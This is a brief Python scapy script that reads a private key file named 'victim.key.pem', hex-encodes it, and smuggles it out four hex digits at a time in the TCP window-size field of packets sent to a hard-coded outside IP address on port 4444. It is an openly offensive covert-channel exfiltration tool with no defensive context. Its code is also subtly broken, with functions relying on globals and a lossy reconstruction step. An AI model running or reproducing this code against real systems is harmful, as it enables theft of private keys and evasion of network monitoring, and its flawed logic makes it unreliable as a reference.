#!/usr/bin/env python3
from scapy.all import *


def ser_data(data):
    return victim_key.encode("utf-8").hex()


def deser_data(data):
    bytes_obj = bytes.fromhex(hex_string)
    return bytes_obj.decode("ASCII")


def chunk(data):
    chunk_len = 4
    return [data[i : i + chunk_len] for i in range(0, len(data), chunk_len)]


if __name__ == "__main__":
    with open("victim.key.pem", "r") as f:
        victim_key = f.read()

    # Serialize into hex
    hex_string = ser_data(victim_key)

    # Chunk it into two-byte chunks
    # TCP receive window size field is two bytes in length
    chunks = chunk(hex_string)

    # print(len(chunks))

    # victim_key2 = deser_data(hex_string)

    # Create custom SYN packets
    packets = []
    for chunk in chunks:
        window_size = int(chunk, 16)
        p = IP(dst="162.243.79.201") / TCP(dport=4444, window=window_size)
        packets.append(p)

    for p in packets:
        send(p)

    reconstructed_hex = "".join(str(hex(p.window))[2:] for p in packets)
    reconstructed_victim_key = deser_data(reconstructed_hex)

    print(reconstructed_victim_key)
